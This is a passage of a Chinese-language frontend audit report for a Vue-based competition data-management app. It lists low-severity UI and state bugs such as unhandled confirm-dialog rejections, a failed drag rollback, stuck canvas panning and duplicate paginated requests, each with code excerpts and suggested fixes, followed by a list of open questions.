async function handleDelete(row: any) {
  if (!authStore.can("contractType:manage")) return;
  await ElMessageBox.confirm(          // 用户点「取消」→ reject 直接抛到事件处理器外
    `确定删除合同类型「${row.name}」吗？已基于该类型创建的实例不受影响。`,
    { type: "warning" },
  );
  try {
    await contractTypesApi.remove(row.id);
```

```ts
async function handleDelete(row: any) {
  await ElMessageBox.confirm(`确定删除合同「${row.name}」吗？`, "删除确认", { … });   // 同样未 catch
  await ElMessageBox.confirm(
    `此操作不可恢复，将彻底删除合同「${row.name}」及其关联数据，确认继续？`,
```

- 触发条件：在合同类型列表或合同列表点「删除」后点「取消」/右上角关闭。
- 后果：`ElMessageBox.confirm` 的 `cancel`/`close` 走 reject（这两处又没带 `distinguishCancelAndClose` 之外的错误处理），异常逃出 async 事件处理器 → Vue 记为未处理错误、`window.onunhandledrejection` 打一行 `[未处理的 Promise 异常] 'cancel'`（`main.ts:52-55`）。当前只污染控制台（同文件其他删除路径都用了 try/catch，属遗漏），但会掩盖真实错误，且一旦后续给全局处理器加上「统一报错弹窗」就会在用户正常取消时误报。
- 修复建议：统一 `try { await ElMessageBox.confirm(…) } catch { return; }`，或抽一个返回 boolean 的 `confirmBox()` 工具函数，禁止裸 `await confirm`。

### [P3] V-14 拖拽保存失败后的「回滚」实际无效，界面停留在未保存位置

- 位置：`frontend/src/views/data-management/MapsManager.vue:1418-1436`
- 代码：

```ts
async function handleNodeDragEnd(node: MapNode) {
  const grp = stageRef.value?.getStage()?.findOne(`#node-${node.id}`);
  if (!grp) return;
  const x = grp.x();
  const y = grp.y();
  try {
    await mapsApi.nodes.update(node.id, { competitionId: compStore.competitionId, x: Math.round(x), y: Math.round(y) });
    node.x = x;
    node.y = y;
  } catch {
    // revert
    grp.x(node.x);          // node.x 已被 handleNodeDragMove 改成 grp.x()，此处等于「回滚到当前值」
    grp.y(node.y);
  }
}
```

- 触发条件：拖拽节点时保存请求失败（无 `data:map:edit` 的服务端 403、网络中断、比赛切换后的错配 id 等）。
- 后果：`handleNodeDragMove`（`:1411-1416`）在拖拽过程中已把 `node.x/node.y` 同步成新位置，因此 catch 里的「回滚」是空操作，节点视觉上停在**没有保存成功**的位置，而服务端仍是旧坐标；用户看到拦截器弹出的错误提示后往往以为位置没变，直到重新加载才发现布局丢失（并可能据此做出错误的地图判断）。
- 修复建议：在 `handleNodeDragStart` 记录起始坐标（`dragStart = {x: node.x, y: node.y}`），catch 里 `grp.position(dragStart); node.x = dragStart.x; node.y = dragStart.y; grp.getLayer()?.batchDraw();`；另外把 `Math.round` 后的坐标同时写回本地节点，避免保存值与显示值差 1px 内的不一致。

### [P3] V-15 画布平移状态可能卡死：在画布上按下、移出画布释放后，鼠标一移动就继续平移

- 位置：`frontend/src/views/data-management/MapsManager.vue:1271-1301`
- 代码：

```ts
function handleStageMouseDown(e: any) {
  if (e.target === e.target.getStage()) {
    isPanning = true;
    lastPointer = getCanvasPos(e);
  } else { isPanning = false; }
}
function handleStageMouseMove(e: any) {
  if (!isPanning) return;
  …
}
function handleStageMouseUp() {     // 只监听 stage 上的 mouseup
  isPanning = false;
  setTimeout(() => { stageOnMove = false; }, 50);
}
```

- 触发条件：在画布空白处按下左键开始平移，把鼠标拖到画布外（例如左侧节点面板/画布外页面）再松开。Konva stage 收不到容器外的 `mouseup`，`isPanning` 保持 `true`。
- 后果：此后鼠标只要在画布上移动（无需按键）就会持续平移地图，画布「自己会动」；由于 `stageOnMove` 同时为真，节点/边的点击选中会被 `selectNode:1364` / `selectEdge:1505` 的早期 return 吞掉，表现为点击节点无反应。必须再在画布空白处完整点一次（或刷新）才能恢复。
- 修复建议：`onMounted` 里补 `window.addEventListener("mouseup", handleStageMouseUp)`（`onBeforeUnmount` 移除），或在 `handleStageMouseMove` 里用 `e.evt.buttons === 0` 作为兜底判定并复位 `isPanning`。

### [P3] V-16 属性面板改动未保存即切换选中/关闭面板 → 静默丢失，无任何提示

- 位置：`frontend/src/views/data-management/MapsManager.vue:914-933`（配合 `:128`、`:211-257`、`:262-307`）
- 代码：

```ts
watch(selectedNode, (n) => {
  if (n) {
    nodeForm.name = n.name;
    nodeForm.region = n.region;
    …
  }
});
watch(selectedEdge, (e) => {
  if (e) { edgeForm.distance = e.distance; edgeForm.pathTypeId = e.pathTypeId; }
});
```

- 触发条件：在右侧「节点属性」里改名/改类型/改坐标（或「路径属性」里改距离）后，直接点击画布上另一个节点/边，或点击空白取消选中（`selectNode` 会 `selectedNode.value = node` 触发 watcher 覆盖表单）。
- 后果：未保存的编辑被 watcher 无条件覆盖且无确认提示（表单与真实数据完全解耦、没有 dirty 标记），用户会误以为已生效；共用一个 `nodeForm` 时「先改 A 再点 B」还会让改动彻底消失，无法恢复。
- 修复建议：给表单加 dirty 标记，选中切换/面板关闭前若有未保存改动则 `ElMessageBox.confirm("有未保存的修改，是否放弃？")`；或改为即时保存（字段 `change` 即 PATCH）。

### [P3] V-17 表单必填标记是装饰性的：科技树表单无 `rules`，地图节点面板连 `el-form` 都没有

- 位置：`frontend/src/views/data-management/TechTreeManager.vue:169-189`、`:510-534`、`MapsManager.vue:215-258`
- 代码：

```vue
    <el-dialog append-to-body v-model="showDialog" :title="isEdit ? '编辑节点' : '新建节点'" width="560px">
      <el-form :model="form" label-width="100px">
        <el-form-item label="名称" required><el-input v-model="form.name" /></el-form-item>
        <el-form-item label="描述"
          ><el-input v-model="form.description" type="textarea" :rows="2"
        /></el-form-item>
        <el-form-item label="层级"><el-input-number v-model="form.tier" :min="0" /></el-form-item>
        <el-form-item label="研发费用" required
```

```ts
async function handleSubmit() {
  submitting.value = true;                     // 无任何前置校验，直接构造 payload
  try {
    const payload = { competitionId: compStore.competitionId, name: form.name, … };
```

（`MapsManager.vue:215` 的节点属性面板同样只有 `<el-form label-width="60px">`，无 `:model`/`:rules`，名称、区域可清空后直接 `saveNode()`。）

- 触发条件：名称留空/纯空格/超长，或清空后提交。
- 后果：`required` 只画出星号；请求发出后由后端拒绝（`apps/tech_tree/serializers.py:26-30`、`apps/maps/serializers.py:92` + DRF `trim_whitespace` + `allow_blank=False` 会返回「该字段不能为空」），用户看到的是顶部通用错误 toast，而不是对应输入框的行内提示；`tier`（`:175`）无 `:precision`，可填入小数（后端 `FloatField` 接受 `T1.5` 之类的层级显示）。功能上不致命，但「必填」标示与实际行为不一致，也是 V-11 的同类问题。
- 修复建议：给这两个表单补 `ref`/`:model`/`:rules` 并 `await validate()`；`tier` 明确 `:precision="0"`/`:step` 或改整数控件；名称统一 `trim` 后再提交。

### [P3] V-18 切换比赛不重置画布平移与缩放 → 新比赛的地图可能整屏不可见

- 位置：`frontend/src/views/data-management/MapsManager.vue:2146-2165`（配合 `:836-842`、`:1611-1646`）
- 代码：

```ts
useCompetitionReload(
  async () => {
    await loadData();
    await loadBackground();
  },
  () => {
    nodes.value = [];
    edges.value = [];
    …
    bgTransform.value = null;
    bgEditMode.value = false;      // 未复位 stage 的 x/y 与 stageScale，也未自动 fitCanvas
  },
);
```

- 触发条件：在画布上平移/缩放到某个位置后切换比赛（视图不卸载）。
- 后果：新比赛的节点坐标与旧比赛无关，但 `stage.x()/y()` 与 `stageScale` 仍是旧值，新地图可能整体落在视口之外 → 用户看到「空白地图」，误以为该比赛没有地图数据（节点列表里其实有数据）；必须手动点「适应画布」。
- 修复建议：`clear()` 中追加 `const st = stageRef.value?.getStage(); st?.x(0); st?.y(0); st?.batchDraw(); stageScale.value = 1;`，并在 `loadData()` 完成后对非空节点集合调用一次 `fitCanvas()`。

### [P3] V-19 异步子组件未配置 `errorComponent`：chunk 加载失败只留空白，无提示无重试

- 位置：`frontend/src/views/data-management/DataManagementView.vue:21-39`
- 代码：

```ts
const MANAGER_COMPONENTS: Record<string, Component> = {
  maps: defineAsyncComponent(() => import("./MapsManager.vue")),
  parts: defineAsyncComponent(() => import("./PartsManager.vue")),
  …
};
const DEFAULT_MANAGER: Component = defineAsyncComponent(() =>
  import("@/components/common/DataManager.vue"),
);
```

- 触发条件：动态 `import()` 失败——发布后旧页面继续点击未加载过的模块（旧 chunk 文件已被新构建覆盖 → `Failed to fetch dynamically imported module`）、弱网、或 Electron 端服务器地址切换后资源不可达。
- 后果：`defineAsyncComponent` 未提供 `loadingComponent`/`errorComponent`/`onError`，加载失败时该分支渲染为空（`v-if="currentConfig"` / `v-else-if="isManagerType"` 都命中，placeholder 不会兜底），用户看到内容区纯空白且无任何错误信息；错误只进 `main.ts:39-49` 的 console，用户唯一的出路是手动刷新整页。
- 修复建议：为这些异步组件统一传 `{ loadingComponent, errorComponent, timeout }`，`errorComponent` 显示「模块加载失败，请刷新页面」并给一个 `location.reload()` 按钮；或对 `import()` 包一层带重试（一次性 `?t=Date.now()` 或 reload）的实现。

### [P3] V-20 `loadMapNodes()` 在渲染路径中被调用且无 in-flight 守卫 → 详情弹窗渲染触发重复的全量分页请求

- 位置：`frontend/src/views/data-management/ContractManageView.vue:1252-1257`（配合 `:988-1015`）
- 代码：

```ts
  if (row.type === "nodeRoute") {
    if (!mapNodes.value.length) loadMapNodes();     // 渲染函数内的副作用
    const ids = Array.isArray(row.value) ? row.value : [];
    if (!ids.length) return "—";
    return ids.map((id: number) => mapNodeName(id)).join(" → ");
  }
```

```ts
async function loadMapNodes() {
  if (mapNodes.value.length || !compStore.competitionId) return;   // 仅在 await 完成后才有数据，期间不设 loading 标记
  try {
    let allNodes: any[] = [];
    let page = 1;
    while (true) {
      const res: any = await mapsApi.nodes.list(page, 200, compStore.competitionId);
      const items = Array.isArray(res) ? res : res?.items ?? [];
      allNodes = allNodes.concat(items);
      if (items.length < 200) break;      // 节点/边各一遍分页循环
      page++;
    }
```

（对照同文件 `loadEntityOptions:810` 是正确写法：`if (… || entityLoading[entityType]) return;` + `finally` 复位。）

- 触发条件：打开含 `nodeRoute` 输入的合同详情（`showDetail` → 弹窗渲染 → `formatInputValue` 被 `v-for` 逐行调用），此时 `mapNodes` 为空。每个渲染批次都会再发一轮「节点全表分页 + 边全表分页」请求，直到首轮返回为止；`openCreate`/`onTypeChange` 也会并发调用同一个函数。
- 后果：一次详情查看可能产生数轮重复的全表分页请求（节点/边各 N 页，服务器压力与首屏耗时放大数倍），并且这些请求结果还会写进长时间存活的 `mapNodes/mapEdges`（V-05 的陈旧数据来源）。功能上不报错，属可观测的性能/资源缺陷。
- 修复建议：加 in-flight 标记（仿 `entityLoading`）并在 `finally` 复位；把加载动作从渲染函数里移出（`watch(detailRow)` 或 `showDetail` 里 `await loadMapNodes()` 后再展示）；`loadMapNodes` 整表加载改为一次性 `mapsApi.full()`（该接口本就一次返回 nodes+edges，省掉两个分页循环）。

---

## 存疑/待确认

1. **[待确认] 燃料单价的大数精度**：`FuelSerializer.pricePerLiter = DecimalField(max_digits=60, decimal_places=4)`，但 `to_representation` 返回 `instance.price_per_liter`（Decimal），DRF 默认 `JSONEncoder` 把 Decimal 编码为 **float**，FuelManager 编辑时 `form.pricePerLiter = row.pricePerLiter ?? 0`（`FuelManager.vue:199`）后原样回写。若确有 >15 位有效数字的单价，编辑一次即发生精度损失（前端未做字符串化）。根因在后端序列化层，建议交由后端审计员确认；前端对应文件 `BigNumberInput.vue` 不在本次范围。
2. **[待确认] 合同编号无格式/长度/唯一性校验**：`saveNumber`（`ContractManageView.vue:1522-1537`）与新建时的 `partyNumbers` 只做 `trim`，后端 `PATCH /contracts/:id/party-numbers` 也只校验角色存在（`apps/contracts/views.py:400-408`）。文档 `docs/BUILD_COMPETITION_API_REFERENCE.md:714` 只说编号「用于识别具体单据」，未要求唯一/格式。是否需要「同比赛内编号唯一/长度上限」属业务约定，故未列为缺陷；若需要，应在前后端同时补。
3. **[待确认] 地图节点名称作为合同输入值**：`ContractManageView.vue:367` 的 `mapNode` 下拉 `:value="m.name"`、`:385` 的 `techNode` 同法，引擎按名称回查（`apps/contracts/engine.py:1442/1462` `filter(competition_id=…, name=name)`）。名称在 `TechTreeManager`/`MapsManager` 里可被改名，改名后历史合同 `inputs` 中的旧名称会查不到（`compute_tech_prerequisites` 返回 `[]`、`compute_tech_research_cost` 返回 0）。名称唯一性由后端 `unique_fields` 保证，因此不是重名歧义而是**改名悬空**；是否属于设计取舍（改名即失效）需产品确认，故未单列缺陷。
4. **[待确认] `DataManagementView` 的 `route.meta.type` 缺省路径**：`type` 为空串时 `currentConfig` 为 `null`、`isManagerType` 为 false → 渲染「此模块正在开发中」占位（`:4-7`），行为合理；但若某 route 的 `meta.type` 拼写与 `MANAGER_COMPONENTS` 键不一致（如 `techTree` vs `tech-tree`），也会静默落到 `DEFAULT_MANAGER`（`moduleConfigs` 若存在同名配置则用配置驱动表格），不会报错。本次未逐一核对全部路由 meta，**未发现问题，仅记录该静默降级点**。
5. **[未覆盖] 权限在服务端的最终判定**：本次只审前端按钮级权限与可见性（`authStore.can(...)`、`canEdit`、`canExecuteRow/canEditParty` 的 companyScopes 逻辑看起来与后端 `_assert_execute_scope` 一致）。能否通过改 id 操作他人/他比赛数据，取决于后端各接口的比赛域与公司范围校验（`apps/common/base_crud.py:73-83`、`apps/common/guards.py`），属后端审计范围；建议与 U05/U03 的结论交叉比对，前端侧未发现可利用的越权入口（除 V-05/V-09 造成的比赛错配外）。
6. **[未覆盖] 与本次 6 个文件同模式的其它视图**：V-04（未传 `pageSize` 被切片为 50 条）与 V-09（无竞态守卫）在 `frontend/src/views/data-management/` 其它文件（如 `MaterialsManager.vue`、`ProductsManager.vue`、`VehiclesManager.vue` 等，均不在本次范围）里很可能同样存在，统计口径为 `api.get("<list>", { params: ... })` 未带 `page/pageSize`，建议其他审计员按同一键检索。
